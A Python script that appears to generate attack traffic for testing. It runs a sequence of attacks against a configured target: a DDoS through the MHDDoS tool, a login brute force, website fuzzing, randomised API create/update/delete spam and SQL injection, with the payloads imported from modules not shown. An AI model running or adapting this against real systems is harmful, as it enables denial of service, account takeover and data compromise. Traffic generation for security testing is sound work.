import logging
import subprocess
import os
import threading
from bruteforce import bruteforce_login, fuzz_website, sqli
from api import Users, Computers
from consts import API_URL, TARGET_IP, API_SPAM_TIMEOUT, DDOS_TIMEOUT, LOGIN_BRUTEFORCE_TIMEOUT, SQLI_TIMEOUT
from random import choice
from time import time, sleep


logger = logging.getLogger(__name__)

# Set the logger level to INFO
logger.setLevel(logging.DEBUG)

# Create a console handler with a message format
ch = logging.StreamHandler()
formatter = logging.Formatter('[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S")
ch.setFormatter(formatter)

# Add the console handler to the logger
logger.addHandler(ch)

users = Users(API_URL, logger)
computers = Computers(API_URL, logger)

api_attacks = [
    users.test_user_creation,
    users.test_user_delete,
    users.test_user_update,
    computers.test_computer_creation,
    computers.test_computer_update,
    computers.test_cpt_delete
]


logger.info("Starting DDoS attack")
process = subprocess.Popen(['python', './MHDDoS/start.py', 'tcp', TARGET_IP, "2", str(DDOS_TIMEOUT), "true"], stderr=subprocess.STDOUT)
sleep(DDOS_TIMEOUT)
os.kill(process.pid, 9)
logger.info("Finished DDoS attack")


logger.info('Starting Login Bruteforce')
bruteforce_login(logger=logger, timeout=LOGIN_BRUTEFORCE_TIMEOUT)
logger.info('Finished Login Bruteforce')


logger.info('Starting Fuzzing')
t = threading.Thread(target=fuzz_website, args=(logger, API_SPAM_TIMEOUT))
t.start()

logger.info('Starting API spam')
current_time = time()
while True:
    sleep(1)

    method = choice(api_attacks)
    method()

    if time() > current_time + API_SPAM_TIMEOUT:
        logger.info('Finishing API spam')
        break

t.join()
logger.info('Starting SQLi')
sqli(logger, SQLI_TIMEOUT)
logger.info('Finishing SQLi')
